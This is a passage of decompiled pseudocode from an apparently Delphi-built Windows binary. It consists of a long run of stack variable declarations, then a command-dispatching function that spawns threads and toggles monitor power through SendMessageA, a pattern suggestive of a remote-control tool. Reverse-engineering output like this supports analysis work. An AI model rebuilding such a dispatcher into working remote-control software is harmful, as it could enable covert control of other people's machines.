*piStack2948;\n    int32_t *piStack2944;\n    uchar *puStack2940;\n    uchar *puStack2936;\n    uint uStack2932;\n    int32_t *piStack2928;\n    uint uStack2924;\n    uint uStack2920;\n    uint uStack2916;\n    uint uStack2912;\n    uint uStack2908;\n    int32_t *piStack2904;\n    int32_t *piStack2900;\n    uchar *puStack2896;\n    uint uStack2892;\n    uint uStack2888;\n    uint uStack2884;\n    uint uStack2880;\n    uint uStack2876;\n    uint uStack2872;\n    uchar *puStack2868;\n    uchar *puStack2864;\n    int32_t *piStack2860;\n    int32_t *piStack2856;\n    uchar *puStack2852;\n    uchar *puStack2848;\n    code *pcStack2844;\n    int32_t *piStack2840;\n    uint uStack2836;\n    uchar *puStack2832;\n    uint uStack2828;\n    uint uStack2824;\n    uint *puStack2820;\n    int32_t *piStack2816;\n    uint uStack2812;\n    uchar *puStack2808;\n    uchar *puStack2804;\n    int32_t *piStack2800;\n    uint uStack2796;\n    int32_t *piStack2792;\n    uint uStack2788;\n    int32_t *piStack2784;\n    uint *puStack2780;\n    uint *puStack2776;\n    code *pcStack2772;\n    uchar *puStack2768;\n    uint uStack2764;\n    uint *puStack2760;\n    uint uStack2756;\n    uint uStack2752;\n    uint *puStack2748;\n    uint *puStack2744;\n    int32_t *piStack2740;\n    int32_t *piStack2736;\n    uchar *puStack2732;\n    uchar *puStack2728;\n    uint uStack2724;\n    uchar *puStack2720;\n    uchar *puStack2716;\n    uchar *puStack2712;\n    int32_t *piStack2708;\n    uint uStack2704;\n    uchar *var_a88h;\n    uchar *puStack2696;\n    uint uStack2692;\n    uint var_a7ch;\n    uint var_a78h;\n    uint uStack2680;\n    int32_t *piStack2676;\n    int32_t iStack2672;\n    int32_t *piStack2668;\n    code *pcStack2664;\n    int32_t *piStack2660;\n    int32_t iStack2656;\n    int32_t *piStack2652;\n    int32_t iStack2648;\n    int32_t *piStack2644;\n    int32_t *piStack2640;\n    uint *puStack2636;\n    uint *puStack2632;\n    int32_t *piStack2628;\n    int32_t *piStack2624;\n    uint uStack2620;\n    uchar *puStack2616;\n    uchar *puStack2612;\n    uint uStack2608;\n    uint uStack2604;\n    uint uStack2600;\n    code *pcStack2596;\n    int32_t *piStack2592;\n    uint uStack2588;\n    uint *puStack2584;\n    uint uStack2580;\n    uint uStack2576;\n    uint *puStack2572;\n    uint *puStack2568;\n    int32_t *piStack2564;\n    uint *puStack2560;\n    code *pcStack2556;\n    uint uStack2552;\n    uint uStack2548;\n    uint uStack2544;\n    uint uStack2540;\n    uint uStack2536;\n    uint uStack2532;\n    int32_t *piStack2528;\n    int32_t *piStack2524;\n    uchar *puStack2520;\n    uchar *puStack2516;\n    uint uStack2512;\n    uint uStack2508;\n    uint uStack2504;\n    uint uStack2500;\n    uint uStack2496;\n    uint uStack2492;\n    uint uStack2488;\n    uint uStack2484;\n    int32_t *piStack2480;\n    int32_t *piStack2476;\n    uchar *puStack2472;\n    uchar *puStack2468;\n    uint uStack2464;\n    int32_t *piStack2460;\n    uint uStack2456;\n    uchar *puStack2452;\n    uchar *puStack2448;\n    uint uStack2444;\n    int32_t *piStack2440;\n    uint *puStack2436;\n    uchar *puStack2432;\n    code *pcStack2428;\n    uchar *puStack2424;\n    uint uStack2420;\n    uint *puStack2416;\n    uint var_968h;\n    uint var_964h;\n    uint *puStack2404;\n    uint *puStack2400;\n    int32_t *piStack2396;\n    int32_t *piStack2392;\n    uchar *puStack2388;\n    uint *puStack2384;\n    code *pcStack2380;\n    uint *puStack2376;\n    uint uStack2372;\n    uint *puStack2368;\n    uint uStack2364;\n    uint uStack2360;\n    uint *puStack2356;\n    uint *puStack2352;\n    uint *puStack2348;\n    uint uStack2344;\n    int32_t *piStack2340;\n    int32_t *piStack2336;\n    uchar *puStack2332;\n    uint *var_914h;\n    code *var_910h;\n    int32_t *var_90ch;\n    uint var_908h;\n    uint *var_904h;\n    uint var_900h;\n    int32_t var_8fch;\n    uint *var_8f8h;\n    uint *var_8f4h;\n    int32_t *var_8f0h;\n    int32_t *var_8ech;\n    uchar *var_8e8h;\n    int32_t *var_8e4h;\n    int32_t *var_8e0h;\n    uchar *var_8dch;\n    uint *var_8d8h;\n    uint var_8d4h;\n    int32_t var_8d0h;\n    uint var_8cch;\n    int32_t *var_8c8h;\n    int32_t var_8c4h;\n    uchar *var_8c0h;\n    uint *var_8bch;\n    uint var_8b8h;\n    int32_t var_8b4h;\n    uint var_8b0h;\n    code *var_8ach;\n    uchar *var_8a8h;\n    uint var_8a4h;\n    uint *var_8a0h;\n    int32_t *var_89ch;\n    uint var_898h;\n    int32_t *var_894h;\n    uint *var_890h;\n    int32_t *var_88ch;\n    code *var_888h;\n    int32_t *var_884h;\n    code *var_880h;\n    uint *var_87ch;\n    uint var_878h;\n    uint *var_874h;\n    uint *var_870h;\n    uint *var_86ch;\n    uint *var_868h;\n    int32_t *var_864h;\n    int32_t *var_860h;\n    int32_t *var_85ch;\n    uint *var_858h;\n    uchar *var_854h;\n    uint *var_850h;\n    uint var_84ch;\n    uint var_848h;\n    uint var_844h;\n    int32_t var_840h;\n    uint var_83ch;\n    uint var_838h;\n    uint *var_834h;\n    uint var_830h;\n    uint var_82ch;\n    uint var_828h;\n    code *var_824h;\n    uchar *var_820h;\n    uint var_81ch;\n    int32_t *var_818h;\n    uint var_814h;\n    int32_t *var_810h;\n    uint var_80ch;\n    int32_t *var_808h;\n    uint *var_804h;\n    int32_t *var_800h;\n    uint var_7fch;\n    int32_t *var_7f8h;\n    uint var_7f4h;\n    int32_t *var_7f0h;\n    int32_t *var_7ech;\n    int32_t *var_7e8h;\n    int32_t *var_7e4h;\n    int32_t *var_7e0h;\n    uint *var_7dch;\n    uint var_7d8h;\n    int32_t *var_7d4h;\n    uint var_7d0h;\n    uint *var_7cch;\n    int32_t var_7c8h;\n    int32_t *var_7c4h;\n    int32_t var_7c0h;\n    code *var_7bch;\n    uint var_7b8h;\n    uint *var_7b4h;\n    uint var_7b0h;\n    uint var_7ach;\n    uint var_7a8h;\n    uint *var_7a4h;\n    uint var_7a0h;\n    uint var_79ch;\n    uint var_798h;\n    uint *var_794h;\n    uint var_790h;\n    uint *var_78ch;\n    uint var_788h;\n    uint *var_784h;\n    uint var_780h;\n    int32_t *var_77ch;\n    uint var_778h;\n    int32_t *var_774h;\n    uint var_770h;\n    uchar *var_76ch;\n    uint lParam;\n    uint *var_764h;\n    int32_t *var_760h;\n    uint *var_75ch;\n    uint *var_758h;\n    code *var_754h;\n    int32_t *var_750h;\n    uint var_74ch;\n    uint *var_748h;\n    int32_t *var_744h;\n    uint var_740h;\n    uint *var_73ch;\n    uint *var_738h;\n    int32_t *var_734h;\n    uint var_730h;\n    uchar *var_72ch;\n    int32_t *var_728h;\n    uint var_724h;\n    uint *var_720h;\n    uint *var_71ch;\n    int32_t *var_718h;\n    uint *var_714h;\n    uint *var_710h;\n    code *var_70ch;\n    uint var_708h;\n    uint var_704h;\n    int32_t *var_700h;\n    uint32_t var_6fch;\n    int32_t *var_6f8h;\n    uint *var_6f4h;\n    int32_t *var_6f0h;\n    int32_t *var_6ech;\n    int32_t *var_6e8h;\n    uchar *var_6e4h;\n    uint *var_6e0h;\n    uchar *var_6dch;\n    uint *var_6d8h;\n    int32_t *var_6d4h;\n    uint *var_6d0h;\n    uint *var_6cch;\n    int32_t *var_6c8h;\n    uint *var_6c4h;\n    int32_t *var_6c0h;\n    uint *var_6bch;\n    int32_t *var_6b8h;\n    code *var_6b4h;\n    uint var_6b0h;\n    int32_t var_6ach;\n    uint *var_6a8h;\n    uint var_6a4h;\n    uint var_6a0h;\n    uint *var_69ch;\n    uint *var_698h;\n    int32_t *var_694h;\n    uint *var_690h;\n    uchar *var_68ch;\n    uint *var_688h;\n    uint *var_684h;\n    uint *var_680h;\n    uint *var_67ch;\n    int32_t *var_678h;\n    uint *var_674h;\n    uint *var_670h;\n    code *var_66ch;\n    uint var_668h;\n    int32_t var_664h;\n    uint *var_660h;\n    uint var_65ch;\n    int32_t var_658h;\n    uint *var_654h;\n    uint *var_650h;\n    int32_t *var_64ch;\n    uint var_648h;\n    uchar *var_644h;\n    uint *var_640h;\n    uint var_63ch;\n    uint var_638h;\n    uint var_634h;\n    int32_t var_630h;\n    int32_t *var_62ch;\n    int32_t *var_628h;\n    int32_t *var_624h;\n    int32_t *var_620h;\n    uint *var_61ch;\n    uint *var_618h;\n    code *var_614h;\n    uint var_610h;\n    uint var_60ch;\n    uint *var_608h;\n    uint var_604h;\n    uint var_600h;\n    uint *var_5fch;\n    uint *var_5f8h;\n    int32_t *var_5f4h;\n    int32_t *var_5f0h;\n    uchar *var_5ech;\n    uint *var_5e8h;\n    int32_t *var_5e4h;\n    int32_t *var_5e0h;\n    uchar *var_5dch;\n    int32_t *var_5d8h;\n    int32_t *var_5d4h;\n    uchar *var_5d0h;\n    int32_t *var_5cch;\n    int32_t *var_5c8h;\n    uchar *var_5c4h;\n    int32_t *var_5c0h;\n    int32_t *var_5bch;\n    uchar *var_5b8h;\n    int32_t *var_5b4h;\n    int32_t *var_5b0h;\n    uchar *var_5ach;\n    uint *var_5a8h;\n    uint var_5a4h;\n    int32_t *var_5a0h;\n    int32_t *var_59ch;\n    uchar *var_598h;\n    uint *var_594h;\n    code *var_590h;\n    uint var_58ch;\n    uint var_588h;\n    uint *var_584h;\n    int32_t var_580h;\n    uint var_57ch;\n    uint *var_578h;\n    uint *var_574h;\n    uint *var_570h;\n    int32_t *var_56ch;\n    int32_t var_568h;\n    uchar *var_564h;\n    uint *var_560h;\n    uint uStack1376;\n    uint uStack1372;\n    code *pcStack1368;\n    uint uStack1364;\n    int32_t *piStack1360;\n    int32_t **ppiStack1356;\n    uint uStack1352;\n    uint uStack1348;\n    int32_t *piStack1328;\n    int32_t *piStack1308;\n    int32_t *piStack1288;\n    int32_t *piStack1284;\n    uint *puStack1280;\n    int32_t *piStack1276;\n    int32_t *piStack1272;\n    uint *puStack1268;\n    int32_t *piStack1264;\n    int32_t *piStack1260;\n    uint *puStack1256;\n    int32_t *piStack1252;\n    int32_t *piStack1248;\n    uchar *puStack1244;\n    uint *puStack1240;\n    code *pcStack1236;\n    uint uStack1232;\n    uint uStack1228;\n    uint *puStack1224;\n    uint *puStack1220;\n    uint uStack1216;\n    int32_t *piStack1212;\n    uint uStack1208;\n    uint uStack1204;\n    uint *puStack1200;\n    uint *puStack1196;\n    uint *puStack1192;\n    uint *puStack1188;\n    int32_t *piStack1184;\n    int32_t *piStack1180;\n    int32_t *piStack1176;\n    uint *puStack1172;\n    int32_t *piStack1168;\n    uint *puStack1164;\n    uint *puStack1160;\n    code *pcStack1156;\n    uint uStack1152;\n    uint uStack1148;\n    uint *puStack1144;\n    uint uStack1140;\n    uint uStack1136;\n    int32_t *piStack1132;\n    uint uStack1128;\n    uchar *puStack1124;\n    uint *puStack1120;\n    int32_t *piStack1116;\n    uint *puStack1112;\n    uint *puStack1108;\n    code *pcStack1104;\n    uint uStack1100;\n    uint uStack1096;\n    uint *puStack1092;\n    uint uStack1088;\n    uint uStack1084;\n    uint *puStack1080;\n    uint *puStack1076;\n    int32_t *piStack1072;\n    int32_t *piStack1068;\n    int32_t *piStack1064;\n    uint *puStack1060;\n    uint *puStack1056;\n    code *pcStack1052;\n    int32_t *piStack1048;\n    uint uStack1044;\n    uint *puStack1040;\n    uint uStack1036;\n    uint uStack1032;\n    int32_t *piStack1028;\n    int32_t *piStack1004;\n    uint *puStack1000;\n    int32_t *piStack996;\n    int32_t *piStack992;\n    uchar *puStack988;\n    int32_t *piStack984;\n    int32_t *piStack980;\n    int32_t *piStack976;\n    uint *puStack972;\n    int32_t *piStack968;\n    int32_t *piStack964;\n    int32_t *piStack960;\n    int32_t *piStack956;\n    int32_t *piStack952;\n    int32_t *piStack948;\n    int32_t *piStack944;\n    int32_t *piStack940;\n    uint *puStack936;\n    uint *puStack932;\n    int32_t *piStack928;\n    uint uStack924;\n    int32_t *piStack920;\n    uint *lpBuffer;\n    int32_t *var_38ch;\n    uint *puStack908;\n    uint *puStack904;\n    int32_t *piStack900;\n    int32_t *piStack896;\n    int32_t *piStack892;\n    uint *puStack888;\n    uint32_t uStack884;\n    int32_t *piStack880;\n    uint32_t uStack876;\n    uchar *puStack872;\n    uint32_t uStack868;\n    uint uStack864;\n    uint uStack860;\n    int32_t *piStack856;\n    uint *var_350h;\n    int32_t *wParam;\n    int32_t *var_348h;\n    int32_t *var_344h;\n    int32_t *var_340h;\n    int32_t *var_33ch;\n    uchar *puStack828;\n    int32_t *var_334h;\n    int32_t *piStack820;\n    int32_t *piStack816;\n    int32_t *piStack812;\n    int32_t *piStack808;\n    uchar *puStack804;\n    int32_t *piStack800;\n    int32_t *piStack796;\n    uchar *var_314h;\n    int32_t *var_310h;\n    int32_t *var_30ch;\n    uchar *var_308h;\n    int32_t *var_304h;\n    int32_t *var_300h;\n    int32_t *var_2fch;\n    int32_t *var_2f8h;\n    int32_t *var_2f4h;\n    uint *puStack756;\n    int32_t *piStack752;\n    uint *puStack748;\n    int32_t *piStack744;\n    uint *var_2e0h;\n    uint *puStack736;\n    uint uStack732;\n    uint uStack728;\n    uint32_t var_2d0h;\n    int32_t *piStack720;\n    uint var_2c8h;\n    int32_t *piStack712;\n    uint *puStack708;\n    uint *puStack704;\n    uint uStack700;\n    int32_t var_2b4h;\n    uint var_2b0h;\n    int32_t *piStack688;\n    int32_t *piStack684;\n    int32_t *piStack680;\n    int32_t *var_2a0h;\n    uint *puStack672;\n    uint *puStack668;\n    uint uStack664;\n    uint32_t var_290h;\n    uint uStack656;\n    uchar uStack652;\n    uchar uStack651;\n    ushort uStack650;\n    uint uStack648;\n    uint *puStack644;\n    int32_t *piStack584;\n    uint *puStack580;\n    uint *puStack576;\n    uint uStack572;\n    uint uStack568;\n    uint uStack564;\n    uint uStack560;\n    uint uStack556;\n    uint uStack552;\n    uint *puStack548;\n    uint uStack544;\n    uint uStack540;\n    uint uStack536;\n    uint uStack532;\n    uint *puStack528;\n    uint uStack524;\n    uint uStack520;\n    uint uStack516;\n    code *pcStack512;\n    uint *puStack508;\n    uint uStack504;\n    uint *puStack500;\n    uint uStack496;\n    uint uStack492;\n    uint *puStack488;\n    int32_t *piStack484;\n    uint uStack480;\n    uchar *puStack476;\n    uint uStack472;\n    uint *puStack468;\n    uint uStack464;\n    uint uStack456;\n    uint uStack452;\n    int32_t *piStack448;\n    uchar *var_140h;\n    int32_t *piStack320;\n    uint uStack316;\n    uint uStack312;\n    uchar *puStack308;\n    uint var_12ch;\n    uint uStack300;\n    uint uStack296;\n    uchar auStack292 [4];\n    uint uStack288;\n    uint *var_118h;\n    uint var_114h;\n    code *var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint uStack256;\n    uint uStack252;\n    int32_t iStack248;\n    int32_t *piStack244;\n    uint uStack240;\n    uint uStack236;\n    int32_t *var_e4h;\n    int32_t *var_e0h;\n    uint *var_dch;\n    uint *var_d8h;\n    int32_t *var_d4h;\n    int32_t *var_d0h;\n    uchar *var_cch;\n    code *var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    code *var_b0h;\n    int32_t *var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    int32_t *var_9ch;\n    uint uStack156;\n    uchar *var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint *var_7ch;\n    int32_t *var_78h;\n    uint uStack120;\n    uchar *puStack116;\n    uint *puStack112;\n    int32_t *var_68h;\n    uint32_t var_64h;\n    uint32_t var_60h;\n    uint32_t var_5ch;\n    code *pcStack92;\n    uint uStack88;\n    uint uStack84;\n    uint *puStack80;\n    uint var_48h;\n    int32_t var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint *var_34h;\n    uint *puStack52;\n    int32_t *var_2ch;\n    int32_t var_28h;\n    uchar *var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    uchar *var_18h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_24h = &stack0xfffffffc;\n    iVar7 = 0x151;\n    do {\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    var_18h = 0x472f89;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    var_18h = 0x472f9a;\n    fcn.00405f08();\n    var_1ch = 0x47bb96;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00472f6c::var_20h;\n    uVar10 = true;\n    var_28h = 0x47ba00;\n    var_2ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00472f6c::var_2ch;\n    puStack52 = 0x472fc3;\n    var_18h = &stack0xfffffffc;\n    fcn.00405894();\n    if (uVar10) {\n        puStack52 = 0x472fdb;\n        fcn.00405784();\n        puStack52 = 0x472fe6;\n        fcn.00472b58();\n    }\n    puStack52 = &fcn.00472f6c::var_564h;\n    var_34h = 0x472fff;\n    fcn.00405964();\n    var_34h = 0x47300f;\n    fcn.00405894();\n    if (uVar10) {\n        var_34h = 0x473027;\n        fcn.004059a4();\n        var_34h = &fcn.00472f6c::var_1ch;\n        var_38h = 0x473038;\n        fcn.00405a48();\n        var_38h = 0x473048;\n        fcn.00405964();\n        var_38h = 0x473055;\n        fcn.00405a48();\n        var_38h = 0x473064;\n        fcn.004059a4();\n        var_38h = &fcn.00472f6c::var_20h;\n        var_3ch = 0x473075;\n        fcn.00405a48();\n        var_3ch = 0x473085;\n        fcn.00405964();\n        var_3ch = 0x473092;\n        fcn.00405a48();\n        var_3ch = 0x4730a1;\n        fcn.004059a4();\n        var_3ch = &fcn.00472f6c::var_24h;\n        var_40h = 0x4730b2;\n        fcn.00405a48();\n        var_40h = 0x4730c2;\n        fcn.00405964();\n        var_40h = 0x4730cf;\n        fcn.00405a48();\n        var_40h = 0x4730de;\n        fcn.004059a4();\n        var_40h = &fcn.00472f6c::var_28h;\n        var_44h = 0x4730ef;\n        iVar7 = fcn.00405a48();\n        uVar10 = iVar7 == 1;\n        var_44h = 0x4730ff;\n        fcn.00405964();\n        var_44h = 0x47310c;\n        fcn.00405a48();\n        var_44h = 0x47311b;\n        fcn.004059a4();\n        var_44h = 0x473126;\n        fcn.00405504();\n        var_44h = 0x14;\n        var_48h = 0x40;\n        puStack80 = 0x47312f;\n        uStack88 = sub.kernel32.dll_LocalAlloc_1();\n        puStack80 = 0x47313d;\n        fcn.004054c0();\n        puStack80 = 0x473148;\n        fcn.004054c0();\n        puStack80 = 0x473153;\n        fcn.004054c0();\n        puStack80 = 0x47315e;\n        fcn.004054c0();\n        puStack80 = 0x473169;\n        fcn.004054c0();\n        puStack80 = &fcn.00472f6c::var_2b4h;\n        uStack84 = 0;\n        pcStack92 = fcn.00482d30;\n        var_5ch = 0;\n        var_60h = 0;\n        var_64h = 0x473181;\n        var_64h = sub.kernel32.dll_CreateThread();\n        var_68h = 0x473187;\n        sub.kernel32.dll_CloseHandle_1();\n    }\n    var_68h = &fcn.00472f6c::var_568h;\n    puStack112 = 0x4731a0;\n    fcn.00405964();\n    puStack112 = 0x4731b0;\n    fcn.00405894();\n    if (uVar10) {\n        puStack112 = 0x4731c4;\n        fcn.004059a4();\n        puStack112 = 0x4731cc;\n        fcn.0048ab4c();\n        *in_FS_OFFSET = var_68h;\n    }\n    else {\n        puStack112 = &fcn.00472f6c::var_56ch;\n        puStack116 = 0x4731f2;\n        fcn.00405964();\n        puStack116 = 0x473202;\n        fcn.00405894();\n        if (uVar10) {\n            puStack116 = 0x47321a;\n            fcn.004059a4();\n            uStack120 = 0x473491;\n            var_78h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_78h;\n            var_7ch = &fcn.00472f6c::var_570h;\n            var_80h = 0x47323c;\n            puStack116 = &stack0xfffffffc;\n            fcn.00405a48();\n            var_80h = 0x47324c;\n            fcn.00405964();\n            var_80h = 0x473257;\n            *0x49891c = fcn.00409e54();\n            var_80h = 0x473269;\n            fcn.00405a48();\n            var_80h = 0x473278;\n            fcn.004059a4();\n            var_80h = 0x498928;\n            var_84h = 0x47328a;\n            fcn.00405a48();\n            var_84h = 0x47329a;\n            fcn.00405964();\n            var_84h = 0x4732a7;\n            fcn.00405a48();\n            var_84h = 0x4732b6;\n            fcn.004059a4();\n            var_84h = 0x498924;\n            var_88h = 0x4732c8;\n            fcn.00405a48();\n            var_88h = 0x4732d8;\n            fcn.00405964();\n            var_88h = 0x4732e5;\n            fcn.00405a48();\n            var_88h = 0x4732f4;\n            fcn.004059a4();\n            var_88h = 0x498930;\n            var_8ch = 0x473306;\n            fcn.00405a48();\n            var_8ch = 0x473316;\n            fcn.00405964();\n            var_8ch = 0x473323;\n            fcn.00405a48();\n            var_8ch = 0x473332;\n            fcn.004059a4();\n            var_8ch = 0x49892c;\n            var_90h = 0x473344;\n            fcn.00405a48();\n            var_90h = 0x473354;\n            fcn.00405964();\n            var_90h = 0x473361;\n            fcn.00405a48();\n            var_90h = 0x473370;\n            fcn.004059a4();\n            var_90h = 0x498938;\n            var_94h = 0x473382;\n            iVar7 = fcn.00405a48();\n            uVar10 = iVar7 == 1;\n            var_94h = 0x473392;\n            fcn.00405964();\n            var_94h = 0x47339f;\n            fcn.00405a48();\n            var_94h = 0x4733ae;\n            fcn.004059a4();\n            var_94h = 0x4733bb;\n            fcn.004054c0();\n            *0x492548 = 1;\n            var_94h = 0x4733d1;\n            fcn.00405894();\n            if (uVar10) {\n                uVar10 = 1;\n                var_94h = 0x4733da;\n                fcn.00488ba4();\n            }\n            var_94h = 0x4733e9;\n            fcn.00405894();\n            if (uVar10) {\n                var_94h = 0x4733f2;\n                fcn.00488cf8();\n            }\n            bVar11 = true;\n            uStack156 = 0x473437;\n            var_9ch = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_9ch;\n            var_a0h = 0x47340f;\n            var_94h = &stack0xfffffffc;\n            fcn.00405894();\n            if (bVar11) {\n                var_a0h = 2;\n                var_a4h = 0xf170;\n                var_a8h = 0x112;\n                var_ach = *(**0x49291c + 0x30);\n                var_b0h = 0x47342d;\n                sub.user32.dll_SendMessageA();\n            }\n            bVar11 = true;\n            *in_FS_OFFSET = var_ach;\n            var_a4h = 0x473450;\n            fcn.00405894();\n            if (bVar11) {\n                var_a4h = 0x473459;\n                fcn.0048a324();\n            }\n            var_a4h = 0x498818;\n            var_a8h = 0;\n            var_ach = NULL;\n            var_b0h = fcn.0047ef10;\n            var_b4h = 0;\n            var_b8h = 0;\n            var_bch = 0x473470;\n            sub.kernel32.dll_CreateThread();\n            var_bch = 0x498818;\n            var_c0h = 0;\n            var_c4h = 0;\n            var_c8h = fcn.0047f68c;\n            var_cch = NULL;\n            var_d0h = NULL;\n            var_d4h = 0x473487;\n            sub.kernel32.dll_CreateThread();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_d0h;\n        }\n        var_c8h = &fcn.00472f6c::var_574h;\n        var_cch = 0x4734b4;\n        fcn.00405964();\n        var_cch = 0x4734c4;\n        fcn.00405894();\n        if (uVar10) {\n            var_cch = 0x4734dc;\n            fcn.004059a4();\n            uVar10 = true;\n            var_d0h = 0x4735ce;\n            var_d4h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_d4h;\n            var_d8h = 0x4734f9;\n            var_cch = &stack0xfffffffc;\n            fcn.00405894();\n            if (uVar10) {\n                var_d8h = 0x473502;\n                fcn.00488ba4();\n            }\n            var_d8h = 0x473511;\n            fcn.00405894();\n            if (uVar10) {\n                var_d8h = 0x47351a;\n                fcn.00488cf8();\n            }\n            var_d8h = 0x473529;\n            fcn.00405894();\n            if (uVar10) {\n                var_d8h = 0x473532;\n                fcn.0048a324();\n            }\n            bVar11 = true;\n            var_dch = 0x473577;\n            var_e0h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_e0h;\n            var_e4h = 0x47354f;\n            var_d8h = &stack0xfffffffc;\n            fcn.00405894();\n            if (bVar11) {\n                var_e4h = 0xffffffff;\n                uStack236 = 0xf170;\n                uStack240 = 0x112;\n                piStack244 = *(**0x49291c + 0x30);\n                iStack248 = 0x47356d;\n                sub.user32.dll_SendMessageA();\n            }\n            *in_FS_OFFSET = piStack244;\n            uStack236 = 0x473590;\n            fcn.004054c0();\n            uStack236 = 0x47359f;\n            fcn.004054c0();\n            uStack236 = 0x4735ae;\n            fcn.004054c0();\n            uStack236 = 0x4735bd;\n            fcn.004054c0();\n            *0x492548 = 0;\n            uVar10 = 1;\n            *in_FS_OFFSET = var_e4h;\n        }\n        var_dch = &fcn.00472f6c::var_578h;\n        var_e0h = 0x4735f1;\n        fcn.00405964();\n        var_e0h = 0x473601;\n        fcn.00405894();\n        if (uVar10) {\n            var_e0h = 0x473615;\n            fcn.004059a4();\n            var_e0h = 0x47361d;\n            fcn.00409e54();\n            var_e0h = 0x473622;\n            fcn.0047e684();\n        }\n        var_e0h = 0x47362f;\n        fcn.00405894();\n        if (uVar10) {\n            uVar10 = 1;\n            *0x498910 = 0;\n            var_e0h = 0x47363d;\n            fcn.00468398();\n        }\n        var_e0h = &fcn.00472f6c::var_57ch;\n        var_e4h = 0x473656;\n        fcn.00405964();\n        var_e4h = 0x473666;\n        fcn.00405894();\n        if (uVar10) {\n            var_e4h = 0x47367e;\n            fcn.004059a4();\n            var_e4h = &fcn.00472f6c::var_8h;\n            uStack236 = 0x47368f;\n            fcn.00405a48();\n            uStack236 = 0x47369f;\n            fcn.00405964();\n            uStack236 = 0x4736ac;\n            fcn.00405a48();\n            uStack236 = 0x4736bb;\n            fcn.004059a4();\n            uStack236 = 0x4736c6;\n            fcn.00405504();\n            uStack236 = 0x4736d3;\n            fcn.004054c0();\n            uStack236 = 0x4736d8;\n            cVar1 = fcn.0048c1c4();\n            if (cVar1 == '\\0') {\n                uStack236 = 0x4736f8;\n                fcn.00405504();\n            }\n            else {\n                uStack236 = 0x4736e9;\n                fcn.00405504();\n            }\n            uStack236 = 0x473703;\n            fcn.0048c0d4();\n            if (var_580h == 0) {\n                uStack236 = 0x473723;\n                fcn.0040546c();\n            }\n            else {\n                uStack236 = 0x473719;\n                fcn.00405504();\n            }\n            uStack236 = 0x47bca8;\n            uStack240 = *0x492524;\n            piStack244 = 0x47bbe4;\n            iStack248 = var_8h;\n            uStack252 = 0x47bcb8;\n            uStack256 = 0x47bcc4;\n            var_100h = 0x47374b;\n            fcn.004632a0();\n            var_100h = var_588h;\n            var_104h = 0x47bcd0;\n            var_108h = 0x473768;\n            fcn.00409ce8();\n            var_108h = var_58ch;\n            var_10ch = 0x47bbe4;\n            var_110h = 0x47377e;\n            fcn.0048beec();\n            var_110h = var_590h;\n            var_114h = 0x47bcb8;\n            var_118h = 0x473794;\n            fcn.0048beb0();\n            var_118h = var_594h;\n            uStack288 = 0x47bbe4;\n            uStack296 = 0x47bbe4;\n            uStack300 = 0x4737ac;\n            var_12ch = fcn.00488f48();\n            uVar10 = 1;\n            uStack300 = 0;\n            puStack308 = 0x4737bb;\n            fcn.00409dd4(var_12ch);\n            puStack308 = var_598h;\n            uStack312 = 0x47bce0;\n            uStack316 = 0x47bbe4;\n            piStack320 = 0x4737d6;\n            fcn.0048c5c8();\n            piStack320 = var_59ch;\n            var_140h = var_18h;\n            fcn.0048c908();\n            fcn.0040a518();\n            fcn.0048af60();\n            fcn.0048bf28();\n            fcn.0048bf90();\n            fcn.0048cf50();\n            fcn.0048ce74();\n            fcn.00405800();\n            fcn.00472b58();\n        }\n        fcn.00405964();\n        fcn.00405894();\n        if (uVar10) {\n            fcn.004059a4();\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.0048c0d4();\n            if (var_5c0h == NULL) {\n                fcn.0040546c();\n            }\n            else {\n                fcn.00405504();\n            }\n            uVar2 = fcn.00488f48();\n            uVar10 = 1;\n            piStack448 = 0x4739fe;\n            fcn.00409dd4(uVar2);\n            piStack448 = var_5c8h;\n            uStack452 = 0x47bce0;\n            uStack456 = 0x47bbe4;\n            uStack464 = 0x47bbe4;\n            puStack468 = 0x473a21;\n            fcn.0048cf50();\n            puStack468 = var_5cch;\n            uStack472 = 0x47bbe4;\n            puStack476 = 0x473a37;\n            fcn.0048bf90();\n            puStack476 = var_5d0h;\n            uStack480 = 0x47bbe4;\n            piStack484 = 0x473a4d;\n            fcn.0048bf28();\n            piStack484 = var_5d4h;\n            puStack488 = 0x473a63;\n            fcn.00405800();\n            puStack488 = 0x473a6e;\n            fcn.00472b58();\n        }\n        puStack488 = &fcn.00472f6c::var_5d8h;\n        uStack492 = 0x473a87;\n        fcn.00405964();\n        uStack492 = 0x473a97;\n        fcn.00405894();\n        if (uVar10) {\n            uStack492 = 0x473aab;\n            fcn.004059a4();\n            uStack492 = 0x473ab3;\n            *0x49891c = fcn.00409e54();\n            uStack492 = 4;\n            uStack496 = 0x40;\n            puStack500 = 0x473ac1;\n            puStack508 = sub.kernel32.dll_LocalAlloc_1();\n            puStack500 = 0x473adb;\n            var_2f4h = puStack508;\n            fcn.00409ce8();\n            puStack500 = 0x473aec;\n            fcn.004054c0();\n            puStack500 = &fcn.00472f6c::var_2b4h;\n            uStack504 = 0;\n            pcStack512 = fcn.00488240;\n            uStack516 = 0;\n            uStack520 = 0;\n            uStack524 = 0x473b04;\n            uStack524 = sub.kernel32.dll_CreateThread();\n            